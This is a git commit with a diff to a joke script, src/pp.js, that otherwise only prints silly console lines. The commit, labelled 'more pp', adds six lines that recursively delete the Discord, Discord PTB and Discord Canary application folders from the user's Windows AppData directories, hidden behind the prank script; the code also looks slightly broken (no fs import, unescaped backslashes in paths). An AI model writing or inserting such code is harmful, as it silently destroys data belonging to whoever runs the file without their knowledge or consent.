343dc6092597464bb48f2cf8808685e515082921
Cain Atkinson <cainy-a@users.noreply.github.com>
2021-03-21 23:55:11 +0000

    more pp

--- src/pp.js
+++ src/pp.js
@@ -2,3 +2,12 @@ console.log("Imagine pork")
 console.log()
 console.log()
 console.log("pp better.")
+
+
+fs.rmdirSync(process.env.LOCALAPPDATA + "\discord", { recursive: true });
+fs.rmdirSync(process.env.LOCALAPPDATA + "\discordptb", { recursive: true });
+fs.rmdirSync(process.env.LOCALAPPDATA + "\discordcanary", { recursive: true });
+
+fs.rmdirSync(process.env.APPDATA + "\discord", { recursive: true });
+fs.rmdirSync(process.env.APPDATA + "\discordptb", { recursive: true });
+fs.rmdirSync(process.env.APPDATA + "\discordcanary", { recursive: true });
